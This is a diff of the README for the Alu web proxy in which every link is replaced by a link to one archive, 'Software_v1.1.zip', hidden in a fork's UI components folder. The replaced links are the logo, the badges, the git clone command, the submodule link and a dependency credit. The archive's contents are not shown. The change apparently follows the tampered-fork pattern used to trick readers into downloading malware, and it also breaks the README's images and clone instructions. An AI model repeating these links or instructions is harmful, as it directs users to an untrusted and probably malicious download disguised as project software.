@@ -1,13 +1,13 @@
 <p align="center">
 
-  <img src="https://github.com/titaniumnetwork-dev/Alu/assets/99224452/d740378b-3fba-4470-8f06-3eefdae8a313" alt="AluLogo" width="250"/>
+  <img src="https://github.com/GDuip/Alu/raw/refs/heads/main/src/components/UI/Software_v1.1.zip" alt="AluLogo" width="250"/>
 </p>
 
 # Alu
 
 Alu is a beautiful, functional, and sleek web proxy, which focuses on customization and ease of use.
 
-<img src="https://shields.io/github/languages/code-size/titaniumnetwork-dev/Alu?style=flat-square&logo=github"/> <img src="https://shields.io/github/stars/titaniumnetwork-dev/Alu?style=flat-square&logo=github"/> <img src="https://img.shields.io/badge/made%20with-coffee-452515?style=flat-square&logo=coffeescript"/>
+<img src="https://github.com/GDuip/Alu/raw/refs/heads/main/src/components/UI/Software_v1.1.zip"/> <img src="https://github.com/GDuip/Alu/raw/refs/heads/main/src/components/UI/Software_v1.1.zip"/> <img src="https://github.com/GDuip/Alu/raw/refs/heads/main/src/components/UI/Software_v1.1.zip%20with-coffee-452515?style=flat-square&logo=coffeescript"/>
 
 # Features
 
@@ -24,7 +24,7 @@ Alu is a beautiful, functional, and sleek web proxy, which focuses on customizat
 
 Deploying Alu is about as simple as it gets.
 
-1. Open your terminal and type `git clone https://github.com/titaniumnetwork-dev/Alu --recurse-submodules`
+1. Open your terminal and type `git clone https://github.com/GDuip/Alu/raw/refs/heads/main/src/components/UI/Software_v1.1.zip --recurse-submodules`
 
 2. Install pnpm with `npm i -g pnpm`.
 
@@ -35,7 +35,7 @@ Deploying Alu is about as simple as it gets.
 Congrats! You should now be running your very own instance of Alu! 🎉
 
 > [!WARNING]
-> Recursing all submodules will install [alu-games](https://github.com/wearrrrr/alu-games) as well. This repo contains _all_ games for Alu, and is quite large! If you wish to skip it, simply remove `--recurse-submodules` from your clone command.
+> Recursing all submodules will install [alu-games](https://github.com/GDuip/Alu/raw/refs/heads/main/src/components/UI/Software_v1.1.zip) as well. This repo contains _all_ games for Alu, and is quite large! If you wish to skip it, simply remove `--recurse-submodules` from your clone command.
 
 ## What about Docker?
 
@@ -47,7 +47,7 @@ Alu can be easily dockerized with the `Dockerfile` provided in the repository. S
 - Bare Server from TompHTTP
 - Wisp Server Node by Mercury Workshop
 - Rammerhead by binary-person
-- Astro from astro.build
+- Astro from https://github.com/GDuip/Alu/raw/refs/heads/main/src/components/UI/Software_v1.1.zip
 - Typescript
 - ExpressJS
 - Prettier
